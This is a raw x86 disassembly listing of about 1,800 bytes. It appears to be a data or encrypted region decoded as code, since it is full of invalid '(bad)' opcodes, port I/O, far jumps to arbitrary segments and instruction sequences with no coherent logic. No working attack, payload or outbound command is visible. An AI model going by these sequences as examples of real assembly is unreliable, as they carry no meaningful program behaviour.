  4221ba:	mov    bl,0x1f
  4221bc:	in     al,0xbf
  4221be:	(bad)  
  4221c0:	fwait
  4221c1:	xor    eax,DWORD PTR [edx+eax*1+0x37]
  4221c5:	inc    ebp
  4221c6:	cmp    BYTE PTR [esi],ah
  4221c8:	into   
  4221c9:	sub    dh,BYTE PTR [ecx]
  4221cb:	mov    cs,WORD PTR [edx]
  4221cd:	iret   
  4221ce:	fdivp  st(7),st
  4221d0:	dec    eax
  4221d1:	lods   al,BYTE PTR ds:[esi]
  4221d2:	jmp    0x4a6:0xa8492300
  4221d9:	push   esp
  4221da:	sbb    cl,BYTE PTR es:[edi+0x4a]
  4221de:	xchg   BYTE PTR [ebp+0x24],cl
  4221e1:	lea    ecx,[edx+0x27]
  4221e4:	dec    edi
  4221e5:	xchg   BYTE PTR [edx+0x2c],al
  4221e8:	xchg   ebp,eax
  4221e9:	sub    ebp,DWORD PTR [edi+0x16]
  4221ec:	sbb    al,bh
  4221ee:	or     BYTE PTR [ebp+0x6069fc64],dh
  4221f4:	push   0x32
  4221f6:	outs   dx,DWORD PTR ds:[esi]
  4221f7:	xor    eax,0x8322bbbf
  4221fc:	jmp    0xbad23e67
  422201:	inc    edx
  422202:	test   BYTE PTR [edx+0x63],ch
  422205:	push   ss
  422206:	fisttp DWORD PTR [ebx]
  422208:	mov    bh,0xab
  42220a:	inc    ebx
  42220b:	pop    eax
  42220c:	jns    0x42221d
  42220e:	dec    esp
  42220f:	add    DWORD PTR ds:0x12bf692d,eax
  422215:	test   DWORD PTR [esi],eax
  422217:	adc    eax,DWORD PTR [ebx-0xb]
  42221a:	out    dx,eax
  42221b:	outs   dx,DWORD PTR ds:[esi]
  42221c:	cmp    esp,DWORD PTR [edi]
  42221e:	or     al,dl
  422220:	or     DWORD PTR [eax+0x15f86a42],ebp
  422226:	and    DWORD PTR [ebp+0x12],eax
  422229:	loop   0x422232
  42222b:	cld    
  42222c:	push   edx
  42222d:	inc    ebx
  42222e:	xchg   ecx,eax
  42222f:	fwait
  422230:	sar    BYTE PTR [eax+0x30a5aa3c],1
  422236:	sbb    al,0xac
  422238:	dec    eax
  422239:	sub    BYTE PTR [ebx],0xb6
  42223c:	adc    edx,0x26
  42223f:	push   0x59b9bf93
  422244:	cli    
  422245:	test   DWORD PTR [esi-0x7e],edx
  422248:	cwde   
  422249:	or     edi,DWORD PTR [ebx]
  42224b:	das    
  42224c:	mov    ecx,0xc0ce2cea
  422251:	sbb    al,0x43
  422253:	xchg   DWORD PTR [eax+0x4d],esi
  422256:	fisttp WORD PTR [ebp-0x696f82db]
  42225c:	shl    eax,1
  42225e:	adc    al,0x17
  422260:	out    0x3b,al
  422262:	xor    dh,ah
  422264:	mov    bl,0xd4
  422266:	push   ebx
  422267:	sub    dl,bl
  422269:	ins    DWORD PTR es:[edi],dx
  42226a:	mov    cl,0xd
  42226c:	jge    0x422217
  42226e:	and    edx,edi
  422270:	mov    ah,0x54
  422272:	cmp    cl,BYTE PTR [ecx+edx*2]
  422275:	mov    ah,bl
  422277:	fmul   st(4),st
  422279:	sbb    dh,cl
  42227b:	push   eax
  42227c:	jmp    0xb794:0x335cb646
  422283:	ret    
  422284:	pop    ecx
  422285:	sar    BYTE PTR [esi+0x3a0a3e9e],cl
  42228b:	inc    edx
  42228c:	xchg   edx,eax
  42228d:	xor    DWORD PTR [eax+0x1259377a],ebp
  422293:	add    DWORD PTR [edx+ecx*4+0x1c211a79],0x2fa99739
  42229e:	mov    edi,0xfcfb9aff
  4222a3:	ret    0xb88e
  4222a6:	push   cs
  4222a7:	jmp    0xe42a:0xb6b045ac
  4222ae:	xchg   DWORD PTR [edx-0x1e],ebp
  4222b1:	and    al,0xc4
  4222b3:	hlt    
  4222b4:	mov    bl,BYTE PTR [edi]
  4222b6:	pop    ss
  4222b7:	into   
  4222b8:	xchg   BYTE PTR [esi-0x75],al
  4222bb:	push   ebp
  4222bc:	mov    ds:0xa0d54bef,eax
  4222c1:	in     eax,0x94
  4222c3:	xchg   esp,eax
  4222c4:	mov    bl,0x96
  4222c6:	sbb    eax,0x954c261d
  4222cb:	push   ebx
  4222cc:	sub    al,0x5a
  4222ce:	push   edx
  4222cf:	cmc    
  4222d0:	scas   eax,DWORD PTR es:[edi]
  4222d1:	rol    BYTE PTR [ecx+0x65],cl
  4222d4:	ja     0x42230b
  4222d6:	clc    
  4222d7:	push   0xffffff9b
  4222d9:	mov    dl,0xaf
  4222db:	push   ds
  4222dc:	jl     0x4222bb
  4222de:	das    
  4222df:	jae    0x4222ed
  4222e1:	adc    al,0x7
  4222e3:	mov    bl,0xa7
  4222e5:	sub    BYTE PTR [ebp+0x67],ch
  4222e8:	mov    WORD PTR [ecx],ss
  4222ea:	aaa    
  4222eb:	jb     0x4222e6
  4222ed:	iret   
  4222ee:	leave  
  4222ef:	push   esp
  4222f0:	jecxz  0x42231b
  4222f2:	adc    ah,dh
  4222f4:	mov    edi,0xa15e0aee
  4222f9:	mov    ah,0x8f
  4222fb:	mov    ebx,0x45f756b9
  422300:	in     eax,0xb7
  422302:	mov    bl,0xaf
  422304:	adc    BYTE PTR ds:0xc217aeeb,bh
  42230a:	scas   al,BYTE PTR es:[edi]
  42230b:	in     al,dx
  42230c:	adc    al,0x93
  42230e:	fist   DWORD PTR [ebx+0x44291b8]
  422314:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422315:	in     al,dx
  422316:	mov    eax,ds:0x984b1a9
  42231b:	push   0xffffffad
  42231d:	cmp    al,0x87
  42231f:	xchg   edx,esp
  422321:	fsub   st,st(0)
  422323:	cmp    al,0x6c
  422325:	imul   ecx,DWORD PTR [ebp+esi*8-0x26d2b9a2],0xf214fcfa
  422330:	pusha  
  422331:	pop    esp
  422332:	push   es
  422333:	mov    al,0x38
  422335:	push   es
  422336:	mov    esp,0x46f5fa02
  42233b:	pop    edi
  42233c:	mov    esi,0xe7ba61d0
  422341:	scas   al,BYTE PTR es:[edi]
  422342:	and    eax,0x73ece8f9
  422347:	outs   dx,BYTE PTR ds:[esi]
  422348:	inc    edx
  422349:	mov    ebp,ebx
  42234b:	fld    QWORD PTR [esi]
  42234d:	pop    esi
  42234e:	es push ss
  422350:	xchg   DWORD PTR [eax],esi
  422352:	imul   BYTE PTR [esi+0x268ab84a]
  422358:	je     0x422321
  42235a:	ror    BYTE PTR [ecx+0x40],cl
  42235d:	add    bl,BYTE PTR [edi+0x687f832b]
  422363:	pop    ebx
  422364:	int3   
  422365:	mov    al,ds:0x50ba2fdb
  42236a:	retf   0x73c3
  42236d:	pop    edx
  42236e:	fisubr DWORD PTR [ebx+eax*1+0x5a25728]
  422375:	dec    ebx
  422376:	add    cl,ah
  422378:	fld    TBYTE PTR ds:0x6c75249
  42237e:	aad    0x10
  422380:	ins    DWORD PTR es:[edi],dx
  422381:	loope  0x4223b9
  422383:	push   0x7a
  422385:	sbb    BYTE PTR [eax],dh
  422387:	out    0xf9,eax
  422389:	repnz cdq 
  42238b:	jp     0x42235b
  42238d:	cmp    BYTE PTR [esi+0x7b2f3ed1],ch
  422393:	mov    eax,ds:0xf53c10f5
  422398:	push   ecx
  422399:	pop    ecx
  42239a:	sahf   
  42239b:	jnp    0x422377
  42239d:	jl     0x422415
  42239f:	(bad)  
  4223a0:	jns    0x42234e
  4223a2:	mov    al,ds:0xdcbd2e5b
  4223a7:	je     0x422427
  4223a9:	fld    DWORD PTR [ebx-0x6e939ccc]
  4223af:	jp     0x42234d
  4223b1:	pop    edi
  4223b2:	jnp    0x4223d3
  4223b4:	cmp    BYTE PTR [edi],al
  4223b6:	jge    0x422387
  4223b8:	inc    esp
  4223b9:	add    eax,0x25bd6d02
  4223be:	les    ebp,FWORD PTR [edi]
  4223c0:	dec    edx
  4223c1:	or     cl,BYTE PTR [edi]
  4223c3:	dec    edi
  4223c4:	pop    ebp
  4223c5:	cs call 0x5f8d:0x4798ffe6
  4223cd:	mov    al,0x4c
  4223cf:	jne    0x422419
  4223d1:	xchg   ecx,eax
  4223d2:	xchg   edi,eax
  4223d3:	(bad)  
  4223d5:	imul   edi,esp,0xa8b91d12
  4223db:	adc    cl,BYTE PTR [eax+0x3]
  4223de:	jmp    0x4223aa
  4223e0:	inc    ecx
  4223e1:	add    al,0xef
  4223e3:	adc    ah,BYTE PTR ds:0xfc448c81
  4223e9:	dec    ecx
  4223ea:	pop    es
  4223eb:	cwde   
  4223ec:	push   ebp
  4223ed:	clc    
  4223ee:	fwait
  4223ef:	loopne 0x422392
  4223f1:	into   
  4223f2:	xor    DWORD PTR [edx],ebp
  4223f4:	jmp    0x2ddb:0x14d11e70
  4223fb:	mov    eax,ds:0x18ed1483
  422400:	fucomp st(1)
  422402:	and    DWORD PTR [edi+esi*4],ebp
  422405:	loop   0x4223ef
  422407:	std    
  422408:	and    al,0x33
  42240a:	jecxz  0x422475
  42240c:	(bad)  
  42240d:	pusha  
  42240e:	(bad)  
  42240f:	mov    esp,0xb568d91e
  422414:	cld    
  422415:	mov    dh,0xe7
  422417:	int3   
  422418:	nop
  422419:	and    eax,ebx
  42241b:	rol    BYTE PTR [edi+edx*8+0x77],1
  42241f:	scas   eax,DWORD PTR es:[edi]
  422420:	test   al,0x9e
  422422:	sub    edx,ebx
  422424:	clc    
  422425:	jo     0x42246e
  422427:	pop    edx
  422428:	pop    ebx
  422429:	sar    BYTE PTR [esi-0xa5d10e4],0x6d
  422430:	pop    ebp
  422431:	mov    edx,0x53680bef
  422436:	call   FWORD PTR [ebp+0x15edfa6a]
  42243c:	adc    eax,0x78d2c43a
  422441:	or     eax,0xbf9485dc
  422446:	sub    bh,ch
  422448:	ret    0xb6e9
  42244b:	mov    ah,0xf3
  42244d:	fld    TBYTE PTR [esi-0x2d46b101]
  422453:	fiadd  WORD PTR [ecx]
  422455:	out    dx,al
  422456:	push   ds
  422457:	in     eax,dx
  422458:	dec    edi
  422459:	enter  0x42e0,0x7f
  42245d:	fst    QWORD PTR [ebp-0x7abfcf4d]
  422463:	sbb    DWORD PTR [edi+ebx*4],0xffffffce
  422467:	retf   0x6a46
  42246a:	adc    eax,0x21211048
  42246f:	ds lahf 
  422471:	push   cs
  422472:	sbb    BYTE PTR [edx],ch
  422474:	les    esi,FWORD PTR [edi+0x5a]
  422477:	sbb    dh,cl
  422479:	jecxz  0x422437
  42247b:	aaa    
  42247c:	mov    DWORD PTR [edx],ecx
  42247e:	aam    0x81
  422480:	dec    esi
  422481:	push   edi
  422482:	cli    
  422483:	jge    0x42247d
  422485:	fimul  WORD PTR [ebx+eax*2+0x7f]
  422489:	mov    edi,0x42e2eca5
  42248e:	sbb    eax,0xb1845156
  422493:	imul   ecx,DWORD PTR [edi-0x61],0xffffffb9
  422497:	arpl   WORD PTR [esi],bx
  422499:	dec    DWORD PTR [esi-0x172b6588]
  42249f:	add    eax,0x9c90554c
  4224a4:	out    0x2a,eax
  4224a6:	in     eax,dx
  4224a7:	add    al,0x48
  4224a9:	xchg   edx,eax
  4224aa:	test   DWORD PTR [edi],0x7ac9cc48
  4224b0:	and    eax,0x412075d6
  4224b5:	lds    ecx,FWORD PTR [edi+0x40631b42]
  4224bb:	add    ebx,DWORD PTR [edi+0x75cfb342]
  4224c1:	aaa    
  4224c2:	push   0x2ba47adf
  4224c7:	gs jmp 0x422540
  4224ca:	idiv   DWORD PTR [esi-0x5d49ca2f]
  4224d0:	pop    esi
  4224d1:	sub    BYTE PTR [ebx],0xc4
  4224d4:	inc    DWORD PTR [ecx-0x43]
  4224d7:	pushf  
  4224d8:	jnp    0x4224d5
  4224da:	xchg   ebx,eax
  4224db:	add    BYTE PTR [ebp+ebp*1-0x50d88518],ch
  4224e2:	aad    0x7f
  4224e4:	add    esi,DWORD PTR [ebx+0x7a]
  4224e7:	fild   DWORD PTR [ebx+edx*8]
  4224ea:	aas    
  4224eb:	xor    eax,0x67d9e049
  4224f0:	adc    eax,0xa2b50186
  4224f5:	cwde   
  4224f6:	sbb    ah,bl
  4224f8:	leave  
  4224f9:	mov    edi,0xb7f5eb16
  4224fe:	das    
  4224ff:	push   ds
  422500:	xchg   edx,eax
  422501:	sar    DWORD PTR [ecx-0xb],0x64
  422505:	add    bh,dl
  422507:	(bad)  
  422508:	push   edi
  422509:	jl     0x4224d1
  42250b:	sbb    BYTE PTR [ecx+esi*1-0x4994f435],dh
  422512:	jmp    0x42257c
  422514:	popf   
  422515:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422516:	push   ds
  422517:	fs jge 0x422557
  42251a:	xor    DWORD PTR [edx],edx
  42251c:	xchg   BYTE PTR ds:0xfecf8e55,bl
  422522:	dec    edi
  422523:	sbb    al,0x17
  422525:	fistp  WORD PTR [ecx+esi*1]
  422528:	dec    edx
  422529:	adc    al,0x92
  42252b:	fdivr  DWORD PTR [eax+ebx*4-0x5f03a778]
  422532:	fist   DWORD PTR [edx-0x4d5deda9]
  422538:	outs   dx,BYTE PTR ds:[esi]
  422539:	jecxz  0x42253b
  42253b:	xor    eax,0x3cf8a81d
  422540:	push   cs
  422541:	adc    eax,0xea6a3fa8
  422546:	mov    ecx,ebx
  422548:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422549:	std    
  42254a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42254b:	dec    edx
  42254c:	stc    
  42254d:	inc    edx
  42254e:	jg     0x42256c
  422550:	mul    BYTE PTR [esi-0x2b]
  422553:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422554:	in     al,0x93
  422556:	lods   eax,DWORD PTR ds:[esi]
  422557:	fcom   DWORD PTR [ebx+edi*8-0x49]
  42255b:	push   es
  42255c:	or     ebp,DWORD PTR [eax-0x11]
  42255f:	xor    al,0xba
  422561:	adc    al,0xe0
  422563:	xor    al,0xe0
  422565:	call   0xc440a144
  42256a:	icebp  
  42256b:	dec    eax
  42256c:	lock xchg ebx,eax
  42256e:	or     DWORD PTR [eax],esp
  422570:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422571:	sbb    al,0xcf
  422573:	lahf   
  422574:	xor    al,BYTE PTR [edi*1-0x3168da49]
  42257b:	lahf   
  42257c:	icebp  
  42257d:	es cmp ah,bh
  422580:	xchg   ecx,eax
  422581:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422582:	imul   edx,DWORD PTR [ebp+0x42],0x4c930327
  422589:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42258a:	sbb    BYTE PTR [ebx],0x47
  42258d:	ret    0x6332
  422590:	popa   
  422591:	mov    ch,0xae
  422593:	pop    ebp
  422594:	mov    ds:0x96ef67bd,al
  422599:	jnp    0x4225f2
  42259b:	add    al,0x63
  42259d:	test   BYTE PTR fs:[esi+esi*8-0x1],dl
  4225a2:	fcom   DWORD PTR [edi-0x3f]
  4225a5:	sahf   
  4225a6:	xor    DWORD PTR ds:0x658ade91,esp
  4225ac:	push   esp
  4225ad:	ret    
  4225ae:	cmp    eax,DWORD PTR [esi+0x39d6333f]
  4225b4:	(bad)  
  4225b5:	nop
  4225b6:	mov    BYTE PTR [esi],dl
  4225b8:	pop    eax
  4225b9:	rcl    dl,cl
  4225bb:	jecxz  0x4225c2
  4225bd:	jbe    0x4225fb
  4225bf:	add    ebp,DWORD PTR [edx]
  4225c1:	fwait
  4225c2:	pop    es
  4225c3:	jne    0x422616
  4225c5:	jne    0x42259b
  4225c7:	ret    
  4225c8:	jl     0x42257c
  4225ca:	and    eax,0x5b2b8dc9
  4225cf:	pop    ss
  4225d0:	sub    esp,DWORD PTR [edi+0x3]
  4225d3:	rol    DWORD PTR [esp+ebx*4+0x6a],0x2a
  4225d8:	ja     0x4225f8
  4225da:	ins    DWORD PTR es:[edi],dx
  4225db:	sahf   
  4225dc:	adc    al,0xc0
  4225de:	xor    bh,dh
  4225e0:	jnp    0x42260e
  4225e2:	mov    edx,0x905b7d33
  4225e7:	inc    edi
  4225e8:	stos   BYTE PTR es:[edi],al
  4225e9:	aas    
  4225ea:	aam    0xf2
  4225ec:	jne    0x4225f7
  4225ee:	aam    0x14
  4225f0:	int3   
  4225f1:	and    eax,DWORD PTR [esi+0x59]
  4225f4:	pop    ss
  4225f5:	ret    
  4225f6:	add    edi,DWORD PTR [edx+0xa]
  4225f9:	(bad)  [edx]
  4225fb:	mov    ebx,0x454cc3d5
  422600:	jmp    0xc940:0x5e79e2c4
  422607:	or     BYTE PTR [edi],bh
  422609:	pop    edi
  42260a:	xor    BYTE PTR [ebp-0x433b969e],dl
  422610:	dec    ch
  422612:	mov    ecx,es
  422614:	xchg   BYTE PTR [eax+0x61],bl
  422617:	pop    ss
  422618:	xchg   ebx,eax
  422619:	ss sub ax,0xea68
  42261e:	retf   
  42261f:	cmp    DWORD PTR [eax],ebp
  422621:	mov    bh,0x84
  422623:	loop   0x4225b3
  422625:	dec    esp
  422626:	repz adc bh,BYTE PTR [eax+ebx*2+0x2b89417e]
  42262e:	(bad)  
  42262f:	pop    ecx
  422630:	jnp    0x42268e
  422632:	maskmovq mm4,mm2
  422635:	push   edx
  422636:	lds    eax,FWORD PTR [esi-0x3ef0afe7]
  42263c:	mov    WORD PTR [edi+0x3d8f58ed],?
  422642:	push   esi
  422643:	jo     0x4225c7
  422645:	gs ins DWORD PTR es:[edi],dx
  422647:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422648:	or     eax,0xb4245064
  42264d:	out    dx,eax
  42264e:	scas   eax,DWORD PTR es:[edi]
  42264f:	sahf   
  422650:	push   edi
  422651:	call   0xe61fdb68
  422656:	jne    0x4226b4
  422658:	div    DWORD PTR [edi+0x2c]
  42265b:	in     al,0x77
  42265d:	test   DWORD PTR [ebx],ecx
  42265f:	xor    ebp,edi
  422661:	mov    ecx,0xcf0e7538
  422666:	aad    0x64
  422668:	sbb    DWORD PTR [eax],ebx
  42266a:	call   0xa022:0xf1611eb5
  422671:	mov    bh,0xec
  422673:	dec    edx
  422674:	iret   
  422675:	stos   BYTE PTR es:[edi],al
  422676:	mov    dh,BYTE PTR [edx]
  422678:	xchg   edx,eax
  422679:	pop    ebp
  42267a:	mov    dh,0x15
  42267c:	and    eax,0x3496b86b
  422681:	repnz pop es
  422683:	rcl    BYTE PTR [eax],1
  422685:	clc    
  422686:	pop    ds
  422687:	pop    esi
  422688:	outs   dx,BYTE PTR ds:[esi]
  422689:	out    dx,eax
  42268a:	add    eax,0x7a95433a
  42268f:	nop
  422690:	bound  ebp,QWORD PTR [ebx-0x62]
  422693:	mov    edi,0xfb759a84
  422698:	sbb    BYTE PTR [eax-0x5a],dh
  42269b:	inc    edi
  42269c:	jns    0x4226ee
  42269e:	add    DWORD PTR [bx+di-0x6e04],ebp
  4226a3:	jmp    0xeef3:0x4d9e631e
  4226aa:	jl     0x422660
  4226ac:	fcmovne st,st(0)
  4226ae:	push   0xbecf11ef
  4226b3:	jg     0x4226ed
  4226b5:	adc    ch,BYTE PTR [edi+edi*2+0x1765fc26]
  4226bc:	mov    ah,cl
  4226be:	(bad)  
  4226bf:	pop    edx
  4226c0:	ret    
  4226c1:	jmp    0x42269c
  4226c3:	inc    eax
  4226c4:	push   esp
  4226c5:	mov    eax,0xccd53325
  4226ca:	shl    BYTE PTR [edx],cl
  4226cc:	mul    DWORD PTR [ecx-0x43]
  4226cf:	jb     0x422668
  4226d1:	popf   
  4226d2:	cmp    BYTE PTR [edi+0x696b9109],dh
  4226d8:	sahf   
  4226d9:	mov    eax,ds:0x9928311b
  4226de:	xchg   esp,eax
  4226df:	mov    dh,0xf
  4226e1:	nop
  4226e2:	mov    dh,0xf1
  4226e4:	mov    ebx,0xa73c2c82
  4226e9:	inc    ebx
  4226ea:	pop    es
  4226eb:	xchg   BYTE PTR [eax+0x74728a5f],al
  4226f1:	xor    al,0x84
  4226f3:	inc    esi
  4226f4:	sub    DWORD PTR [eax+0x14580b8f],ebx
  4226fa:	test   eax,0xde1806ca
  4226ff:	push   ebp
  422700:	xchg   ebp,eax
  422701:	clc    
  422702:	inc    esi
  422703:	ror    BYTE PTR [edi-0x68],0x4b
  422707:	and    eax,edi
  422709:	repz mul DWORD PTR [esp+edx*1+0x7229784e]
  422711:	ss pushf 
  422713:	ins    DWORD PTR es:[edi],dx
  422714:	xlat   BYTE PTR ds:[ebx]
  422715:	lock cmp BYTE PTR [ecx],dh
  422718:	std    
  422719:	repnz popa 
  42271b:	push   esp
  42271c:	jmp    0xbc34ac13
  422721:	push   cs
  422722:	iret   
  422723:	in     al,dx
  422724:	cwde   
  422725:	xchg   edx,eax
  422726:	mov    eax,0xaa3efac2
  42272b:	lods   eax,DWORD PTR ds:[esi]
  42272c:	and    ecx,DWORD PTR [eax+0x2e]
  42272f:	dec    eax
  422730:	fwait
  422731:	popf   
  422732:	jge    0x422774
  422734:	cmp    al,0xa2
  422736:	sti    
  422737:	mov    ch,0x9b
  422739:	test   al,0xf5
  42273b:	jo     0x422781
  42273d:	mov    edi,0x621deecf
  422742:	mov    al,ds:0x677b30bd
  422747:	cmp    al,0xb4
  422749:	pushf  
  42274a:	mov    bh,0xbc
  42274c:	outs   dx,BYTE PTR ds:[esi]
  42274d:	pushf  
  42274e:	and    esi,DWORD PTR [ebx+0x17]
  422751:	loopne 0x4226fb
  422753:	cld    
  422754:	out    dx,al
  422755:	xchg   ebx,eax
  422756:	jmp    0x98b7:0x736c44a4
  42275d:	pop    ss
  42275e:	hlt    
  42275f:	(bad)  
  422760:	fcmove st,st(7)
  422762:	inc    edx
  422763:	dec    eax
  422764:	stos   BYTE PTR es:[edi],al
  422765:	das    
  422766:	imul   esp,DWORD PTR [eiz*4-0x351a4b06],0x44
  42276e:	push   ebp
  42276f:	xor    ebp,esp
  422771:	ret    
  422772:	(bad)  
  422773:	pushf  
  422774:	jmp    DWORD PTR [edi]
  422776:	mov    es,WORD PTR [esi+0x30]
  422779:	outs   dx,DWORD PTR ds:[esi]
  42277a:	xchg   edi,eax
  42277b:	jo     0x422752
  42277d:	xchg   edi,eax
  42277e:	imul   esp,DWORD PTR [ebx+0x63],0x9d566e52
  422785:	dec    edx
  422786:	xchg   ebp,eax
  422787:	push   0x7f
  422789:	inc    ebp
  42278a:	xchg   edi,eax
  42278b:	or     esp,esp
  42278d:	ss pop ebp
  42278f:	push   ebx
  422790:	les    ebx,FWORD PTR [ecx]
  422792:	xchg   esp,eax
  422793:	adc    edx,DWORD PTR [ebp+0x1]
  422796:	push   ebp
  422797:	fwait
  422798:	arpl   WORD PTR [edx],sp
  42279a:	sub    ebx,eax
  42279c:	push   es
  42279d:	ja     0x422813
  42279f:	retf   0xd444
  4227a2:	(bad)  
  4227a3:	mov    ecx,0x17846baf
  4227a8:	pusha  
  4227a9:	lds    eax,FWORD PTR [edx]
  4227ab:	push   ds
  4227ac:	mov    ebp,0x29d8e4c4
  4227b1:	pop    es
  4227b2:	rcr    ebx,1
  4227b4:	mov    edi,0x6309d804
  4227b9:	and    dl,dh
  4227bb:	push   0x6c0847c1
  4227c0:	call   0x1f3:0xafaa674
  4227c7:	fbstp  TBYTE PTR [ecx-0x2de311cf]
  4227cd:	pop    ecx
  4227ce:	or     eax,0xbbe9928d
  4227d3:	in     eax,dx
  4227d4:	dec    ecx
  4227d5:	inc    eax
  4227d6:	(bad)  
  4227d7:	out    0x3d,al
  4227d9:	(bad)  
  4227da:	scas   al,BYTE PTR es:[edi]
  4227db:	out    dx,al
  4227dc:	in     eax,0xba
  4227de:	enter  0x6125,0x4d
  4227e2:	push   ebx
  4227e3:	fnstenv [esi+edx*8]
  4227e6:	sar    DWORD PTR [eax],cl
  4227e8:	xchg   DWORD PTR [ecx+ecx*2-0x7007ffd1],ebp
  4227ef:	popf   
  4227f0:	das    
  4227f1:	mov    ebp,0xe87c72c7
  4227f6:	jo     0x42281c
  4227f8:	add    al,0x61
  4227fa:	xor    BYTE PTR [ebx+edi*8],0x3b
  4227fe:	lods   al,BYTE PTR ds:[esi]
  4227ff:	sbb    esi,edx
  422801:	pop    edi
  422802:	or     BYTE PTR [ecx-0x1c2eba92],dl
  422808:	imul   esi,DWORD PTR [ebp-0x2c217993],0xdd56dfc0
  422812:	ins    BYTE PTR es:[edi],dx
  422813:	lods   al,BYTE PTR ds:[esi]
  422814:	enter  0x3d30,0x74
  422818:	jp     0x4227e3
  42281a:	jns    0x42280d
  42281c:	sahf   
  42281d:	xchg   ebx,eax
  42281e:	xchg   ebx,eax
  42281f:	pop    ecx
  422820:	retf   
  422821:	jp     0x422801
  422823:	lods   eax,DWORD PTR ds:[esi]
  422824:	outs   dx,DWORD PTR ds:[esi]
  422825:	scas   al,BYTE PTR es:[edi]
  422826:	jle    0x422840
  422828:	and    dl,BYTE PTR [ebx+0x2a56e841]
  42282e:	pop    ss
  42282f:	std    
  422830:	int3   
  422831:	inc    ebx
  422832:	scas   al,BYTE PTR es:[edi]
  422833:	in     al,0xeb
  422835:	or     ebx,DWORD PTR [esi-0x42349095]
  42283b:	fsubr  st,st(5)
  42283d:	jae    0x4228ad
  42283f:	add    ecx,esi
  422841:	call   0xb485:0xccfc832d
  422848:	std    
  422849:	lea    eax,[edi-0x60]
  42284c:	add    ch,BYTE PTR [eax-0x38f38f07]
  422852:	mov    esp,0x6031f6c3
  422857:	mov    al,0xc1
  422859:	push   esp
  42285a:	mov    dh,0x2a
  42285c:	imul   edi,DWORD PTR [ebx-0x350f1c71],0xffffffae
  422863:	dec    ebx
  422864:	push   0xffffff98
  422866:	jns    0x42282e
  422868:	out    dx,eax
  422869:	dec    edx
  42286a:	xor    BYTE PTR [ebx+0x18],bl
  42286d:	(bad)  
  42286e:	ja     0x422844
  422870:	dec    ebp
  422871:	fcomp  QWORD PTR [ecx+0x17]
  422874:	adc    al,0x53
  422876:	ins    DWORD PTR es:[edi],dx
  422877:	ret    0xda81
  42287a:	jl     0x4228ca
  42287c:	push   eax
  42287d:	lods   eax,DWORD PTR ds:[esi]
  42287e:	icebp  
  42287f:	lahf   
  422880:	push   esi
  422881:	pop    esp
  422882:	call   0x10b1:0x3f7cfa4a
  422889:	out    dx,eax
  42288a:	add    BYTE PTR [ecx-0x62],al
  42288d:	clc    
  42288e:	jae    0x4228cd
  422890:	dec    edx
  422891:	add    al,0xc6
  422893:	cmp    eax,0x6565fe59
  422898:	dec    DWORD PTR [eax]
  42289a:	inc    esp
  42289b:	sub    eax,DWORD PTR [eax+edx*1-0xd]
  42289f:	add    eax,0xfbf8c38c
  4228a4:	pop    ecx
  4228a5:	add    ebx,DWORD PTR [ebx-0x73dc1a07]
  4228ab:	adc    bh,BYTE PTR [edx-0x53581ec3]
  4228b1:	cmc    
  4228b2:	push   edi
  4228b3:	fstp   DWORD PTR [esi+0x1910a9cb]
  4228b9:	push   ss
  4228ba:	jecxz  0x4228b9
  4228bc:	out    dx,eax
  4228bd:	adc    esi,edi
  4228bf:	and    DWORD PTR [ebp-0x120e1e11],0xffffff96
  4228c6:	sti    
  4228c7:	lea    edx,[eax]
  4228c9:	add    esp,DWORD PTR ds:0x948e80fa
  4228cf:	shr    BYTE PTR [ecx],1
  4228d1:	jno    0x422863
  4228d3:	lea    ecx,[esi-0xa]
  4228d6:	push   ebp
  4228d7:	push   ss
  4228d8:	rcr    ah,0xb9
  4228db:	fcomip st,st(6)
  4228dd:	dec    eax
  4228de:	dec    edi
  4228df:	sbb    DWORD PTR [ebx-0x57],ebp
  4228e2:	nop
  4228e3:	retw   0x2825
  4228e7:	clc    
  4228e8:	mov    esi,0x2e54474
  4228ed:	pop    es
  4228ee:	cld    
  4228ef:	push   esp
  4228f0:	push   cs
  4228f1:	and    dl,dh
  4228f3:	or     al,0x9a
  4228f5:	inc    esi
  4228f6:	(bad)  
  4228f7:	fnstsw WORD PTR [edi+0x5f8c0a06]
  4228fd:	popa   
  4228fe:	push   ss
  4228ff:	das    
  422900:	std    
  422901:	xchg   esp,eax
  422902:	cmp    eax,0xa831b54a
  422907:	or     ch,ah
  422909:	es mov cl,0xb7
  42290c:	and    ebx,DWORD PTR [ecx-0x55]
  42290f:	stos   DWORD PTR es:[edi],eax
  422910:	or     ah,dl
  422912:	mov    ebx,0xa134096c
  422917:	jb     0x4228d3
  422919:	adc    ebp,edi
  42291b:	sbb    edx,esi
  42291d:	jp     0x422934
  42291f:	iret   
  422920:	mov    WORD PTR [edx+0x5e2d354f],?
  422926:	mov    ch,0xae
  422928:	ds fadd st(2),st
  42292b:	ins    DWORD PTR es:[edi],dx
  42292c:	cmp    al,0xae
  42292e:	xchg   ebp,eax
  42292f:	enter  0xe488,0x74
  422933:	mov    dh,0xf3
  422935:	jmp    0xcbf0:0x1a1aba43
  42293c:	add    eax,0x8bf5a4eb
  422941:	mov    bh,0xaf
  422943:	mov    BYTE PTR [edi],dl
  422945:	repnz bswap ebx
  422948:	and    ch,BYTE PTR [eax-0x2e]
  42294b:	push   edi
  42294c:	sub    ch,BYTE PTR [ecx+ecx*1+0x101a830c]
  422953:	repz mov ebx,0xfa9f7a13
  422959:	fwait
  42295a:	std    
  42295b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42295c:	sbb    bh,BYTE PTR [ebp+0x7b197ddc]
  422962:	fs (bad) 
  422964:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422965:	and    eax,0xb069fd2f
  42296a:	ror    DWORD PTR [edx],cl
  42296c:	push   ebp
  42296d:	sub    DWORD PTR [ebx],0x69
  422970:	fs xchg esi,eax
  422972:	out    dx,eax
  422973:	mov    ebx,0x11a6e8ee
  422978:	out    0x33,eax
  42297a:	ins    DWORD PTR es:[edi],dx
  42297b:	retf   0x22c1
  42297e:	rcr    BYTE PTR [ecx+edx*8+0x684c079f],0x1d
  422986:	adc    eax,0x6b52408c
